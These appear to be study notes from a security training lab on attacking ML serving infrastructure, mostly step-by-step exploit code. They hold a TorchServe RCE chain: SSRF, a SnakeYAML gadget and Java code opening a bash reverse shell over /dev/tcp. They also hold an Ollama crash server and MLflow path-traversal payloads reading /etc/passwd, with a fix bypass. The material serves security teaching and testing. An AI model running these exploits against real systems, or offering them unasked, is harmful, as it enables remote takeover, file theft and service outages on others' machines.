# Model Deployment Tampering & Vulnerable Framework CVEs


## Model Deployment Tampering

Attackers manipulate the model during transfer, integration, or hosting. Changes evade standard testing because the model behaves normally under most conditions.

**Direct tampering:** Exploit broken access control to upload a modified model file.
**Indirect tampering:** Poison training data via exposed FTP/storage - model gets retrained on poisoned data.

## ShellTorch - TorchServe RCE Exploit Chain

Three chained vulnerabilities in TorchServe (CVE-2023-43654 + CVE-2022-1471):

1. **Misconfigured Management API** - exposed on all interfaces, no authentication
2. **SSRF** - `/workflows` endpoint fetches remote URLs with no validation
3. **SnakeYAML deserialization RCE** - malicious YAML in `.war` file triggers Java code execution

### Step-by-step Exploitation

**Setup - SSH port forwarding:**
```bash
# -R 8000: attacker's 8000 accessible on target (serve payload)
# -R 4444: attacker's 4444 accessible on target (catch reverse shell)
# -L 8081: target's management API accessible locally
ssh htb-stdnt@TARGET -p PORT -R 8000:127.0.0.1:8000 -R 4444:127.0.0.1:4444 -L 8081:127.0.0.1:8081 -N
```

**Step 1 - Confirm management API access (unauthorized remote access):**
```bash
curl http://127.0.0.1:8081/
# Returns JSON error = confirmed accessible without auth
```

**Step 2 - Confirm SSRF:**
```bash
nc -lnvp 8000   # listener on attacker
curl -X POST 'http://127.0.0.1:8081/workflows?url=http://127.0.0.1:8000/ssrf'
# nc listener gets a hit = SSRF confirmed
```

**Step 3 - Prepare deserialization payload:**

Create `handler.py`:
```python
def initialize(self, context):
    self.model = self.load_model()
```

Create `spec.yaml` (SnakeYAML gadget - loads Java class from attacker):
```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:8000/"]]]]
```
- YAML parser sees special `!!` tags
- It creates Java objects automatically
- A `URLClassLoader` is created pointing to `http://127.0.0.1:8000/`
- `ScriptEngineManager` uses that class loader
- Java may download and load attacker controlled code from that server

Create the `pwn.war` archive:
```bash
pip3 install torch-workflow-archiver
torch-workflow-archiver --workflow-name pwn --spec-file spec.yaml --handler handler.py
```

**Step 4 - Prepare Java payload (`MyScriptEngineFactory.java`):**

```java
package exploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class MyScriptEngineFactory implements ScriptEngineFactory {

    String command = "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1";
    public MyScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", command });
        } catch (IOException e) { e.printStackTrace(); }
    }

    @Override public String getEngineName() { return null; }
    @Override public String getEngineVersion() { return null; }
    @Override public List<String> getExtensions() { return null; }
    @Override public List<String> getMimeTypes() { return null; }
    @Override public List<String> getNames() { return null; }
    @Override public String getLanguageName() { return null; }
    @Override public String getLanguageVersion() { return null; }
    @Override public Object getParameter(String key) { return null; }
    @Override public String getMethodCallSyntax(String obj, String m, String... args) { return null; }
    @Override public String getOutputStatement(String toDisplay) { return null; }
    @Override public String getProgram(String... statements) { return null; }
    @Override public ScriptEngine getScriptEngine() { return null; }
}
```

Compile and create directory structure:
```bash
# Requires Java 17 - Java 21 does NOT work
javac MyScriptEngineFactory.java -source 17 -target 17

mkdir -p META-INF/services/ exploit/
echo 'exploit.MyScriptEngineFactory' > META-INF/services/javax.script.ScriptEngineFactory
mv exploit/MyScriptEngineFactory.class exploit/
```

**Step 5 - Trigger RCE:**
```bash
python3 -m http.server 8000  # serve files from directory containing META-INF/, exploit/, pwn.war

curl -X POST 'http://127.0.0.1:8081/workflows?url=http://127.0.0.1:8000/pwn.war'
```

**Expected request sequence on attacker's web server:**
```
GET /pwn.war
GET /META-INF/services/javax.script.ScriptEngineFactory
GET /exploit/MyScriptEngineFactory.class
GET /rce   <- RCE confirmed
```


## CVE-2025-1975 - Ollama DoS

**Affected:** ollama `0.5.11`
**Type:** Denial of Service - server crash
**Cause:** No array size validation when downloading a model manifest from a remote server

**Exploit - malicious Flask server:**
```python
from flask import Flask
app = Flask(__name__)

@app.route("/v2/dos/model/manifests/latest")
def exploit():
    return {"layers": [{}]}  # empty layers array triggers crash

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

```bash
python3 server.py
# Start ollama: ./ollama serve

# Trigger crash
curl -X POST -H 'Content-Type: application/json' -d '{"model": "http://localhost:5000/dos/model", "insecure": true}' http://localhost:11434/api/pull
# ollama crashes: panic: runtime error: slice bounds out of range
```


## CVE-2023-6909 - MLflow LFI (Path Traversal via Query String)

**Affected:** MLflow `2.7.1`
**Type:** Local File Inclusion via path traversal in URL query string

```bash
pip3 install mlflow==2.7.1
mlflow server --host 127.0.0.1 --port 8080

# Step 1: Create experiment with path traversal in artifact_location
curl -X POST -H 'Content-Type: application/json' -d '{"name": "pwn", "artifact_location": "http:///?/../../../../../../../../../"}' 'http://127.0.0.1:8080/ajax-api/2.0/mlflow/experiments/create'
# Returns: {"experiment_id": "563025420075628626"}

# Step 2: Create a run in the experiment
curl -X POST -H 'Content-Type: application/json' -d '{"experiment_id": "563025420075628626"}' 'http://127.0.0.1:8080/api/2.0/mlflow/runs/create'
# Note the run_id

# Step 3: Create a registered model
curl -X POST -H 'Content-Type: application/json' -d '{"name": "pwn_model"}' 'http://127.0.0.1:8080/ajax-api/2.0/mlflow/registered-models/create'

# Step 4: Link model to run with file:/// source
curl -X POST -H 'Content-Type: application/json' -d '{"name": "pwn_model", "run_id": "RUN_ID", "source": "file:///"}' 'http://127.0.0.1:8080/ajax-api/2.0/mlflow/model-versions/create'

# Step 5: Read arbitrary files
curl 'http://127.0.0.1:8080/model-versions/get-artifact?path=etc/passwd&name=pwn_model&version=1'
```


## CVE-2024-1594 - MLflow LFI Bypass (Path Traversal via URL Fragment)

**Affected:** MLflow `2.7.1` - `2.9.2` (bypass of CVE-2023-6909 fix)
**Fix bypass:** Use `#` (fragment) instead of `?` (query string) - the `..` check only applied to query strings

```bash
pip3 install mlflow==2.9.2
mlflow server --host 127.0.0.1 --port 8080

# Old payload rejected: "Invalid query string"
# New payload - path traversal in fragment:
curl -X POST -H 'Content-Type: application/json' -d '{"name": "pwn2", "artifact_location": "http:///#../../../../../../../../../etc/"}' 'http://127.0.0.1:8080/ajax-api/2.0/mlflow/experiments/create'

# Exploitation steps are identical to CVE-2023-6909 from here
```
